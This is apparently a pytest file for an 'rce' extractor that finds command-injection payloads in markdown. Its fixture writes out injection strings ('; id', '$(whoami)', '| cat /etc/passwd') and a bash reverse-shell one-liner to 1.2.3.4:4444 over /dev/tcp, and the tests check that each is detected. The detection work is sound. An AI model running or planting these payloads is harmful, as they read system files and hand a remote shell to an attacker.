from src.extractors import EXTRACTORS
from src.extractors.rce import extract

MD = """
Payload:

```
; id #
```

Also `$(whoami)`, `uname -a`, `| cat /etc/passwd` and a reverse shell
`bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`.
"""


def payloads():
    return [c.payload for c in extract(1, MD)]


def test_finds_command_separator():
    assert any("; id" in p for p in payloads())


def test_finds_command_substitution():
    assert any("$(whoami)" in p for p in payloads())


def test_finds_pipe_to_command():
    assert any("| cat /etc/passwd" in p for p in payloads())


def test_finds_reverse_shell():
    assert any("/dev/tcp/" in p for p in payloads())


def test_registered():
    assert EXTRACTORS["rce"] is extract
